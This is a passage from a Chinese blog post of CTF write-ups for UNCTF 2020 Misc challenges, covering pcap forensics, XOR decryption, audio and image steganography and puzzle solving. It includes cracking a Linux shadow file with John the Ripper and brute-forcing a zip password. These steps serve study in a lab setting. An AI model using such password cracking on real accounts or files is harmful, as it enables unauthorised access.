<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-21</span> <span class="number">-848</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-944</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1056</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1264</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1328</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1344</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1376</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1392</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1408</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1424</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1456</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-2144</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-2176</span></span><br><span class="line"><span class="number">-21</span> <span class="number">-2192</span></span><br><span class="line"><span class="number">-20</span> <span class="number">-2208</span></span><br><span class="line"><span class="number">-19</span> <span class="number">-2224</span></span><br><span class="line"><span class="number">-19</span> <span class="number">-2224</span></span><br><span class="line"><span class="number">-18</span> <span class="number">-2240</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>得到这些点之后，需要将他们画出来，因而需要辅以gnuplot 或者其他的绘图工具。我这里使用的是gnuplot，命令为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">plot</span> <span class="string">"result.txt"</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/images/unctf2020/gnuplot.png" alt=""></p>
<p>得到flag。</p>
<p>flag：unctf{U5BC@P}</p>
<h4 id="YLB绝密文件"><a href="#YLB绝密文件" class="headerlink" title="YLB绝密文件"></a>YLB绝密文件</h4><p>下载附件是一个流量包。</p>
<p>wireshark打开，筛选http流。</p>
<p>找到关键数据</p>
<p><img src="/images/unctf2020/py.png" alt=""></p>
<p>将这两个文件数据导出。x-python是一个名为xor.py的python脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> key</span><br><span class="line">file = open(<span class="string">"YLBSB.docx"</span>, <span class="string">"rb"</span>)</span><br><span class="line">enc = open(<span class="string">"YLBSB.xor"</span>, <span class="string">"wb"</span>)</span><br><span class="line">plain = base64.b64encode(file.read())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">    d = chr(c ^ ord(key[count % len(key)]))</span><br><span class="line">    enc.write(d.encode())</span><br><span class="line">    count = count + <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>另一个x-python-code是一个pyc文件：</p>
<p><img src="/images/unctf2020/pyc.png" alt=""></p>
<p>我们首先看这个py脚本，发现我们需要得到解密所需的key以及一个YLBSB.xor文件</p>
<p>在数据包中，http流还有一处存在一个zip文件。</p>
<p><img src="/images/unctf2020/zip.png" alt=""></p>
<p>将其导出得到YLBSB.zip，压缩包中就存放着我们需要的YLBSB.xor文件。</p>
<p>key值的获取就是我们把上面得到的pyc进行反编译，可得到key=’YLBSB?YLBNB!’</p>
<p>根据xor.py编写脚本，数据写入YLBSB.docx</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#-*-codin<span class="variable">g:utf</span>-<span class="number">8</span>-*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">key = <span class="string">'YLBSB?YLBNB!'</span></span><br><span class="line">enc = <span class="keyword">open</span>(<span class="string">"YLBSB.xor"</span>, <span class="string">"rb"</span>)</span><br><span class="line"><span class="keyword">file</span> = <span class="keyword">open</span>(<span class="string">"YLBSB.txt"</span>, <span class="string">"wb"</span>)</span><br><span class="line">plain = enc.<span class="keyword">read</span>()</span><br><span class="line"><span class="built_in">count</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">c</span> in plain:</span><br><span class="line">  d = chr(<span class="keyword">c</span> ^ ord(key[<span class="built_in">count</span> % <span class="built_in">len</span>(key)]))</span><br><span class="line">  <span class="keyword">file</span>.<span class="keyword">write</span>(d.encode())</span><br><span class="line">  <span class="built_in">count</span> = <span class="built_in">count</span> + <span class="number">1</span></span><br><span class="line"><span class="keyword">file</span>.<span class="keyword">close</span>()</span><br><span class="line">enc.<span class="keyword">close</span>()</span><br><span class="line"><span class="keyword">file</span> = <span class="keyword">open</span>(<span class="string">"YLBSB.txt"</span>, <span class="string">"rb"</span>)</span><br><span class="line"><span class="keyword">files</span> = <span class="keyword">open</span>(<span class="string">"YLBSB.docx"</span>, <span class="string">"wb"</span>)</span><br><span class="line">plain = base64.b64decode(<span class="keyword">file</span>.<span class="keyword">read</span>())</span><br><span class="line"><span class="keyword">files</span>.<span class="keyword">write</span>(plain)</span><br></pre></td></tr></table></figure></div>

<p>得到docx文档，这个docx文档还挺有意思的，记述了YLB的详细流程…</p>
<p>在文档的最下方存在一段不可见字符，选中之后改变字体颜色，得到flag。</p>
<p><img src="/images/unctf2020/docx.png" alt=""></p>
<p>flag：UNCTF{Best_YLB_Ever}</p>
<h4 id="网络深处1"><a href="#网络深处1" class="headerlink" title="网络深处1"></a>网络深处1</h4><p>题目描述</p>
<blockquote>
<p>好孩子不要上洋葱鸭</p>
</blockquote>
<p>下载附件，得到</p>
<p><img src="/images/unctf2020/number.png" alt=""></p>
<p>首先看这个txt文本，描述所说zip文件的解压密码就是wav中的电话号码。</p>
<p>使用Audacity打开这个wav文件。选择频谱图</p>
<p><img src="/images/unctf2020/pinpu.png" alt=""></p>
<p>发现正好是十一段，对应电话号码的长度。对于这样的音频，网上有相关工具可以直接识别出电话号码。</p>
<p><a href="http://www.dialabc.com/sound/detect/index.html" target="_blank" rel="noopener">http://www.dialabc.com/sound/detect/index.html</a></p>
<p><img src="/images/unctf2020/DTMF.png" alt=""></p>
<p>得到电话号码为：15975384265</p>
<p>解密压缩包得到电话录音.wav和另一个txt文本。根据txt文本的内容我们需要找到wav文件里面的有用信息。</p>
<p>继续使用Audacity工具打开这个wav文件，调至频谱图得到：</p>
<p><img src="/images/unctf2020/tupper.png" alt=""></p>
<p>根据tupper这一信息，我们得到如下解密脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Tupper_self_referential_formula</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">  size = <span class="number">17</span></span><br><span class="line">  k=<span class="number">636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    d = ((-size * x) - (y % size))</span><br><span class="line">    e = reduce(<span class="keyword">lambda</span> x,y: x*y, [<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(-d)]) <span class="keyword">if</span> d <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    f = ((y / size) / e)</span><br><span class="line">    g = f % <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.5</span> &lt; g</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> aa <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(k+<span class="number">60</span>,k<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">      line = <span class="string">""</span></span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">107</span>*aa,<span class="number">107</span>*(aa+<span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> f(x,y):</span><br><span class="line">          line +=<span class="string">"*"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          line += <span class="string">" "</span></span><br><span class="line">      <span class="keyword">print</span> line</span><br><span class="line"></span><br><span class="line">Tupper_self_referential_formula()</span><br></pre></td></tr></table></figure></div>

<p>运行得到：</p>
<p><img src="/images/unctf2020/detupper.png" alt=""></p>
<p>flag：flag{Y29pbA==}</p>
<h4 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h4><p>下载题目，解压出来一个倒影.exe文件。但并不能运行，记事本查看后发现，文件头是jpg格式的。</p>
<p>我们直接修改后缀为jpg，得到一张图片，接着使用十六进制编辑器查看</p>
<p><img src="/images/unctf2020/base.png" alt=""></p>
<p>发现了一大串base64编码的字符串，进行解密得到：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000</span>B4000000A500100010000000006050B405106D6A9EA24E5767106D7AD58AC22940106D7AD58AC229400081001000000000000200A0478747E27616C666000000000000000200000000000000420080000000910000005297D4535E1555E5C90000801000A000F32010B405B4ECC7E9889EDF1BA30C6FF71836EBCFE9A735EFD6E501CE14109505827764B69DC37C6E2E478747E27616C66600000080000000910000005297D4535E1555E5C90000801000A04030B405</span><br></pre></td></tr></table></figure></div>

<p>通过观察这段解密后的数据发现这其实是一个zip格式的逆数据。将其逆过来之后变为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">504</span>B03040A00010800009C5E5551E5354D79250000001900000008000000666C61672E747874E2E6C73CD96B46772850590141EC105E6DFE537A9EFCBE63817FF6C03AB1FDE9889E7CCE4B504B01023F000A00010800009C5E5551E5354D792500000019000000080024000000000000002000000000000000666C61672E7478740A002000000000000100180004922CA85DA7D60104922CA85DA7D6017675E42AE9A6D601504B050600000000010001005A0000004B0000000000</span><br></pre></td></tr></table></figure></div>

<p>将这段数据作为十六进制数保存成zip文件</p>
<p>打开压缩包发现需要密码，采取zip压缩包密码爆破</p>
<p><img src="/images/unctf2020/baopo.png" alt=""></p>
<p>得到密码658745，解密压缩包，得到flag。</p>
<p>flag：UNCTF{Th13_Is_@_F1@G}</p>
<h4 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h4><p>题目描述</p>
<blockquote>
<p>flag被删除了，你能恢复它吗</p>
</blockquote>
<p>下载附件，得到名为flag的文件</p>
<p>这题不知道是不是有点问题，通过记事本打开就可以直接搜索flag</p>
<p>flag：unctf{congratulations!}</p>
<h4 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h4><p>题目是一个shadow文件，是linux中存放的shadow密码文件</p>
<p><img src="/images/unctf2020/shadow.png" alt=""></p>
<p>通过观察，除root以外登陆成功的只有guguguguji这一用户，我们需要的就是解密该账户后面的字符串。</p>
<p>linux中存在一个工具，可以解密shadow文件，命令为：john shadow</p>
<p><img src="/images/unctf2020/john.png" alt=""></p>
<p>得到密码为123456。最后加密md5得到flag。</p>
<p>flag：unctf{e10adc3949ba59abbe56e057f20f883e}</p>
<h4 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h4><p>题目是很多的图片块，需要进行拼图。</p>
<p>利用工具gaps。</p>
<p>首先我们需要将所有的图片整合成一张图片。利用代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PIL.Image <span class="keyword">as</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">IMAGES_PATH = <span class="string">'ez_image/'</span></span><br><span class="line">IMAGE_SIZE = (<span class="number">60</span>, <span class="number">60</span>) <span class="comment"># 每张小图片的大小</span></span><br><span class="line">IMAGE_ROW = <span class="number">15</span> <span class="comment"># 大图行数</span></span><br><span class="line">IMAGE_COLUMN = <span class="number">15</span> <span class="comment"># 大图列数</span></span><br><span class="line">IMAGE_SAVE_PATH = <span class="string">'final.jpg'</span> <span class="comment"># 图片转换后的地址</span></span><br><span class="line"></span><br><span class="line">image_names = os.listdir(IMAGES_PATH) <span class="comment"># 获取图片集地址下的所有图片名称</span></span><br><span class="line">image_names.sort() <span class="comment"># 排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(image_names) != IMAGE_ROW * IMAGE_COLUMN:</span><br><span class="line">  <span class="keyword">raise</span> ValueError(<span class="string">"合成图片的参数和要求的数量不能匹配！"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_compose</span><span class="params">()</span>:</span></span><br><span class="line">  to_image = Image.new(<span class="string">'RGB'</span>, (IMAGE_COLUMN * IMAGE_SIZE[<span class="number">0</span>], IMAGE_ROW * IMAGE_SIZE[<span class="number">1</span>])) <span class="comment">#创建一个新图</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, IMAGE_ROW + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, IMAGE_COLUMN + <span class="number">1</span>):</span><br><span class="line">      from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - <span class="number">1</span>) + x - <span class="number">1</span>]).resize(</span><br><span class="line">        (IMAGE_SIZE[<span class="number">0</span>], IMAGE_SIZE[<span class="number">1</span>]),Image.ANTIALIAS)</span><br><span class="line">      to_image.paste(from_image, ((x - <span class="number">1</span>) * IMAGE_SIZE[<span class="number">0</span>], (y - <span class="number">1</span>) * IMAGE_SIZE[<span class="number">1</span>]))</span><br><span class="line">  <span class="keyword">return</span> to_image.save(IMAGE_SAVE_PATH) </span><br><span class="line"></span><br><span class="line">image_compose()</span><br></pre></td></tr></table></figure></div>

<p>整合好的图片如下：</p>
<p><img src="/images/unctf2020/final.png" alt=""></p>
<p>接着使用gaps工具进行拼图。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps –<span class="attribute">image</span>=final.jpg –<span class="attribute">generations</span>=50 –<span class="attribute">population</span>=225 –<span class="attribute">size</span>=60</span><br></pre></td></tr></table></figure></div>

<p>得到拼好的图片：</p>
<p><img src="/images/unctf2020/ok.png" alt=""></p>
<p>flag：UNCTF{EZ_MISC_AND_HACK_FUN}</p>
<h4 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h4><p>题目是一个不太完整的二维码，正常来说需要进行修复，但这个我们通过qrcode直接进行扫描就得到了flag。</p>
<p><img src="/images/unctf2020/QRCode.png" alt=""></p>
<p>flag：unctf{QR@2yB0x}</p>

    </div>

    
    
    
		<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">----------------本文结束<i class="fa fa-heart"></i>感谢阅读----------------</div>
    
</div>

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/UNCTF/" rel="tag"><i class="fa fa-tag"></i> UNCTF</a>
              <a href="/tags/writewp/" rel="tag"><i class="fa fa-tag"></i> writewp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/10/10/weblogic-SSRF-CVE-2014-4210/" rel="prev" title="weblogic-SSRF(CVE-2014-4210)">
      <i class="fa fa-chevron-left"></i> weblogic-SSRF(CVE-2014-4210)
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/12/05/CVE-2020-14882-14883%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="CVE-2020-14882&14883漏洞分析">
      CVE-2020-14882&14883漏洞分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UNCTF2020公开赛WP"><span class="nav-number">1.</span> <span class="nav-text">UNCTF2020公开赛WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-ssrf"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">easy_ssrf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easyunserialize"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">easyunserialize</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezphp"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easyflask"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">easyflask</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#babyeval"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">babyeval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easyphp"><span class="nav-number">1.1.0.6.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-upload"><span class="nav-number">1.1.0.7.</span> <span class="nav-text">easy_upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#L0vephp"><span class="nav-number">1.1.0.8.</span> <span class="nav-text">L0vephp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UN’s-online-tools"><span class="nav-number">1.1.0.9.</span> <span class="nav-text">UN’s_online_tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezfind"><span class="nav-number">1.1.0.10.</span> <span class="nav-text">ezfind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#check-sql"><span class="nav-number">1.1.0.11.</span> <span class="nav-text">check_sql</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">1.2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#YLBNB"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">YLBNB</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fan"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">fan</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#do-you-like-me"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">do_you_like_me?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#你真的会pwn吗？"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">你真的会pwn吗？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwngirl"><span class="nav-number">1.2.0.5.</span> <span class="nav-text">pwngirl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原神"><span class="nav-number">1.2.0.6.</span> <span class="nav-text">原神</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#babyheap"><span class="nav-number">1.2.0.7.</span> <span class="nav-text">babyheap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#keer’s-bug"><span class="nav-number">1.2.0.8.</span> <span class="nav-text">keer’s_bug</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">1.3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#re-checkin"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">re_checkin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反编译"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">反编译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easyMaze"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">easyMaze</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-rsa"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">easy_rsa</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#鞍山大法官开庭之缺的营养这一块怎么补"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">鞍山大法官开庭之缺的营养这一块怎么补</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简单的RSA"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">简单的RSA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wing"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">wing</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#signin"><span class="nav-number">1.4.0.5.</span> <span class="nav-text">signin</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#YLB’s-CAPTCHA-签到题"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">YLB’s CAPTCHA - 签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#baba-is-you"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">baba_is_you</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#阴阳人编码"><span class="nav-number">1.5.0.3.</span> <span class="nav-text">阴阳人编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爷的历险记"><span class="nav-number">1.5.0.4.</span> <span class="nav-text">爷的历险记</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#躲猫猫"><span class="nav-number">1.5.0.5.</span> <span class="nav-text">躲猫猫</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#零"><span class="nav-number">1.5.0.6.</span> <span class="nav-text">零</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mouse-click"><span class="nav-number">1.5.0.7.</span> <span class="nav-text">mouse_click</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#YLB绝密文件"><span class="nav-number">1.5.0.8.</span> <span class="nav-text">YLB绝密文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网络深处1"><span class="nav-number">1.5.0.9.</span> <span class="nav-text">网络深处1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#倒影"><span class="nav-number">1.5.0.10.</span> <span class="nav-text">倒影</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#被删除的flag"><span class="nav-number">1.5.0.11.</span> <span class="nav-text">被删除的flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#你能破解我的密码吗"><span class="nav-number">1.5.0.12.</span> <span class="nav-text">你能破解我的密码吗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EZ-IMAGE"><span class="nav-number">1.5.0.13.</span> <span class="nav-text">EZ_IMAGE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#撕坏的二维码"><span class="nav-number">1.5.0.14.</span> <span class="nav-text">撕坏的二维码</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="As1def"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">As1def</p>
  <div class="site-description" itemprop="description">听懂了一首歌,生活中回响着旋律</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/As1def" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:why.asldef@qq.com" title="E-Mail → mailto:why.asldef@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://plus.google.com/As1def" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
      </span>
      <span class="links-of-author-item">
